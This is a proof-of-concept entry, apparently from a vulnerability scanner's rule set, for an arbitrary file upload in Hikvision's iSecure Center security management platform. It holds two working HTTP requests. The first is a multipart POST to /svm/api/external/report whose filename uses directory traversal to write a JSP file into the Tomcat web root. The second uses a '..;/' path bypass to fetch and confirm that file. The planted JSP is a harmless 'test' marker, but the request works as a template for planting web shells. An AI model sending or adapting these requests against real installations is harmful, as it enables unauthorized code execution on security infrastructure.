{
        'name': '综合安防管理平台 iSecure Center /api/external/report 任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/svm/api/external/report',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a'
            },
            'data': """------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip


<%out.print("test");%>


------WebKitFormBoundary9PggsiM755PLa54a--""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/portal/ui/login/..;/..;/new.jsp',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'test'
        }}]
    }